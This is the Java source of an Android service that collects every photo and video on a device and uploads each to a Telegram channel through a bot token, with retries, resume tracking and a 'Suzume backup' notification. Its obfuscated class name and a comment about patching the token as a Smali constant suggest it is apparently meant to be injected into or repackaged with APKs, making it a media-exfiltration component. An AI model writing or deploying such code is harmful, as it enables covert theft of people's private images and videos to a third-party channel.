package com.tenix.svault;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentUris;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.AssetFileDescriptor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.MediaStore;

import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class inq extends Service {

    // ── CONFIG (static — NOT final → single const-string in Smali <clinit>) ──
    static String BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE";
    static String CHANNEL_ID = "YOUR_CHANNEL_ID_HERE";
    // ─────────────────────────────────────────────────────────────────────────
    // Public channel  → @channel_username
    // Private channel → -1001234567890

    private static final String NOTIF_CH   = "suzume_upload";
    private static final int    NOTIF_ID   = 55;
    private static final long   MAX_SIZE   = 50L * 1024 * 1024; // 50 MB
    private static final String PREFS_NAME = "suzume_done";
    private static final String PREFS_KEY  = "ids";

    private static volatile boolean running = false;

    private NotificationManager nm;
    private ExecutorService     outer;
    private final Object        lock = new Object();

    // ── Service lifecycle ─────────────────────────────────────

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        initNotifChannel();

        // Must call startForeground within 5 s
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, buildNotif("Suzume starting…", 0, 0, 0),
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIF_ID, buildNotif("Suzume starting…", 0, 0, 0));
        }

        if (running) return START_STICKY; // already in progress
        running = true;

        outer = Executors.newSingleThreadExecutor();
        outer.execute(() -> {
            try { runUpload(); }
            finally { running = false; stopSelf(); }
        });

        return START_STICKY; // restart if killed → resumes from saved progress
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (outer != null) outer.shutdownNow();
    }

    // ── Main upload flow ──────────────────────────────────────

    private void runUpload() {

        // 1 — verify bot token
        String[] r1 = {""};
        if (getMe(r1) != 200) {
            errorNotif("❌ Bot token invalid!\n" + r1[0]); return;
        }

        // 2 — verify channel
        String[] r2 = {""};
        int ch = sendText("🔵 Suzume backup started", r2);
        if (ch != 200) {
            errorNotif("❌ Channel error!\nID: " + CHANNEL_ID + "\nCode: " + ch + "\n" + r2[0]);
            return;
        }

        // 3 — collect + filter already-done
        ArrayList<Uri> all = collectMedia();
        Set<String> done = getDoneIds();
        ArrayList<Uri> pending = new ArrayList<>();
        for (Uri u : all) {
            if (!done.contains(String.valueOf(ContentUris.parseId(u)))) pending.add(u);
        }

        int total     = pending.size();
        int alreadyOk = all.size() - total;
        AtomicInteger processed = new AtomicInteger(0);
        AtomicInteger succeeded = new AtomicInteger(0);
        AtomicInteger skipped   = new AtomicInteger(0);

        if (total == 0) {
            doneNotif(alreadyOk, all.size(), 0); return;
        }

        // 4 — 2 parallel upload threads (fastest safe rate for Telegram)
        ExecutorService pool = Executors.newFixedThreadPool(2);
        for (Uri uri : pending) {
            pool.submit(() -> {
                if (getFileSize(uri) > MAX_SIZE) {
                    skipped.incrementAndGet();
                } else {
                    int code = uploadWithRetry(uri);
                    if (code == 200) {
                        succeeded.incrementAndGet();
                        markDone(ContentUris.parseId(uri));
                    }
                }
                int cur = processed.incrementAndGet();
                updateNotif(cur, total, succeeded.get() + alreadyOk);
            });
        }

        pool.shutdown();
        try { pool.awaitTermination(24, TimeUnit.HOURS); }
        catch (InterruptedException e) { Thread.currentThread().interrupt(); }

        doneNotif(succeeded.get() + alreadyOk, all.size(), skipped.get());
    }

    // ── Upload with retry + 429 backoff ───────────────────────

    private int uploadWithRetry(Uri uri) {
        for (int attempt = 0; attempt < 3; attempt++) {
            int code = sendDocument(uri);
            if (code == 200) return 200;
            if (code == 429) {
                // Rate limited — back off
                try { Thread.sleep(5000L * (attempt + 1)); }
                catch (InterruptedException e) { Thread.currentThread().interrupt(); return -1; }
            } else if (code >= 500) {
                try { Thread.sleep(2000); }
                catch (InterruptedException e) { Thread.currentThread().interrupt(); return -1; }
            } else {
                return code; // 400/404 — no point retrying
            }
        }
        return -1;
    }

    // ── Telegram: getMe ───────────────────────────────────────

    private int getMe(String[] out) {
        try {
            HttpURLConnection c = open(
                    "https://api.telegram.org/bot" + BOT_TOKEN + "/getMe", 15_000);
            int code = c.getResponseCode();
            out[0] = drain(c, code); c.disconnect();
            return code;
        } catch (Exception e) { out[0] = e.getMessage(); return -1; }
    }

    // ── Telegram: sendMessage ─────────────────────────────────

    private int sendText(String text, String[] out) {
        try {
            HttpURLConnection c = openPost(
                    "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", 15_000);
            c.setRequestProperty("Content-Type",
                    "application/x-www-form-urlencoded; charset=UTF-8");
            String body = "chat_id=" + enc(CHANNEL_ID) + "&text=" + enc(text);
            byte[] bytes = body.getBytes("UTF-8");
            c.setRequestProperty("Content-Length", String.valueOf(bytes.length));
            DataOutputStream o = new DataOutputStream(c.getOutputStream());
            o.write(bytes); o.flush(); o.close();
            int code = c.getResponseCode();
            out[0] = drain(c, code); c.disconnect();
            return code;
        } catch (Exception e) { out[0] = e.getMessage(); return -1; }
    }

    // ── Telegram: sendDocument ────────────────────────────────

    private int sendDocument(Uri uri) {
        try {
            String mime  = getContentResolver().getType(uri);
            if (mime == null) mime = "application/octet-stream";
            String fname = getFileName(uri, mime);
            String bound = "SZB" + System.currentTimeMillis();

            HttpURLConnection c = openPost(
                    "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", 180_000);
            c.setRequestProperty("Content-Type",
                    "multipart/form-data; boundary=" + bound);
            c.setRequestProperty("Connection", "close");

            DataOutputStream out = new DataOutputStream(c.getOutputStream());
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            out.writeBytes(CHANNEL_ID + "\r\n");
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; "
                    + "name=\"document\"; filename=\"" + fname + "\"\r\n");
            out.writeBytes("Content-Type: " + mime + "\r\n\r\n");
            try (InputStream in = getContentResolver().openInputStream(uri)) {
                byte[] buf = new byte[16384]; int n;
                if (in != null) while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
            }
            out.writeBytes("\r\n--" + bound + "--\r\n");
            out.flush(); out.close();

            int code = c.getResponseCode();
            drain(c, code); c.disconnect();
            return code;
        } catch (Exception e) { return -1; }
    }

    // ── Media scanning ────────────────────────────────────────

    private ArrayList<Uri> collectMedia() {
        ArrayList<Uri> list = new ArrayList<>();
        try (Cursor c = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media._ID},
                null, null, MediaStore.Images.Media.DATE_ADDED + " ASC")) {
            if (c != null) while (c.moveToNext())
                list.add(ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, c.getLong(0)));
        } catch (Exception ignored) {}
        try (Cursor c = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Video.Media._ID},
                null, null, MediaStore.Video.Media.DATE_ADDED + " ASC")) {
            if (c != null) while (c.moveToNext())
                list.add(ContentUris.withAppendedId(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI, c.getLong(0)));
        } catch (Exception ignored) {}
        return list;
    }

    private long getFileSize(Uri uri) {
        try {
            AssetFileDescriptor a = getContentResolver().openAssetFileDescriptor(uri, "r");
            if (a != null) { long s = a.getLength(); a.close(); return Math.max(s, 0); }
        } catch (Exception ignored) {}
        return 0;
    }

    private String getFileName(Uri uri, String mime) {
        try (Cursor c = getContentResolver().query(uri,
                new String[]{MediaStore.MediaColumns.DISPLAY_NAME}, null, null, null)) {
            if (c != null && c.moveToFirst()) {
                String n = c.getString(0);
                if (n != null && !n.isEmpty()) return n;
            }
        } catch (Exception ignored) {}
        String ext = "";
        if (mime != null) switch (mime) {
            case "image/jpeg":            ext = ".jpg"; break;
            case "image/png":             ext = ".png"; break;
            case "image/gif":             ext = ".gif"; break;
            case "image/webp":            ext = ".webp"; break;
            case "image/heic":            ext = ".heic"; break;
            case "video/mp4":             ext = ".mp4"; break;
            case "video/3gpp":            ext = ".3gp"; break;
            case "video/quicktime":       ext = ".mov"; break;
            case "video/x-matroska":      ext = ".mkv"; break;
        }
        return "media_" + System.currentTimeMillis() + ext;
    }

    // ── Progress persistence (resume support) ─────────────────

    private Set<String> getDoneIds() {
        synchronized (lock) {
            return new HashSet<>(getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                    .getStringSet(PREFS_KEY, new HashSet<>()));
        }
    }

    private void markDone(long id) {
        synchronized (lock) {
            SharedPreferences p = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            Set<String> ids = new HashSet<>(p.getStringSet(PREFS_KEY, new HashSet<>()));
            ids.add(String.valueOf(id));
            p.edit().putStringSet(PREFS_KEY, ids).apply();
        }
    }

    // ── HTTP helpers ──────────────────────────────────────────

    private HttpURLConnection open(String url, int timeout) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(timeout); c.setReadTimeout(timeout);
        return c;
    }

    private HttpURLConnection openPost(String url, int readTimeout) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true); c.setDoInput(true);
        c.setConnectTimeout(30_000); c.setReadTimeout(readTimeout);
        return c;
    }

    private String drain(HttpURLConnection c, int code) {
        try {
            InputStream s = code == 200 ? c.getInputStream() : c.getErrorStream();
            if (s == null) return "";
            StringBuilder sb = new StringBuilder();
            byte[] buf = new byte[1024]; int n;
            while ((n = s.read(buf)) != -1) sb.append(new String(buf, 0, n, "UTF-8"));
            s.close(); return sb.toString();
        } catch (Exception e) { return ""; }
    }

    private static String enc(String s) {
        try { return java.net.URLEncoder.encode(s, "UTF-8"); }
        catch (Exception e) { return s; }
    }

    // ── Notifications ─────────────────────────────────────────

    private void initNotifChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            nm.createNotificationChannel(new NotificationChannel(
                    NOTIF_CH, "Suzume Upload", NotificationManager.IMPORTANCE_LOW));
    }

    @SuppressWarnings("deprecation")
    private Notification buildNotif(String title, int cur, int total, int ok) {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.ic_menu_upload)
         .setContentTitle(title)
         .setOngoing(true);
        if (total > 0) {
            b.setContentText(cur + " / " + total + "   ✓ " + ok);
            b.setProgress(total, cur, false);
        }
        return b.build();
    }

    private void updateNotif(int cur, int total, int ok) {
        nm.notify(NOTIF_ID, buildNotif("Suzume — uploading", cur, total, ok));
    }

    @SuppressWarnings("deprecation")
    private void errorNotif(String msg) {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.ic_dialog_alert)
         .setContentTitle("Suzume — Error")
         .setStyle(new Notification.BigTextStyle().bigText(msg))
         .setContentText(msg).setAutoCancel(true).setOngoing(false);
        nm.notify(NOTIF_ID, b.build());
        stopForeground(true);
    }

    @SuppressWarnings("deprecation")
    private void doneNotif(int ok, int total, int skipped) {
        String text = ok + " / " + total + " sent";
        if (skipped > 0) text += "  •  " + skipped + " skipped (>50MB)";
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.ic_menu_upload)
         .setContentTitle("Suzume — complete")
         .setContentText(text).setAutoCancel(true).setOngoing(false);
        nm.notify(NOTIF_ID, b.build());
        stopForeground(true);
    }
}
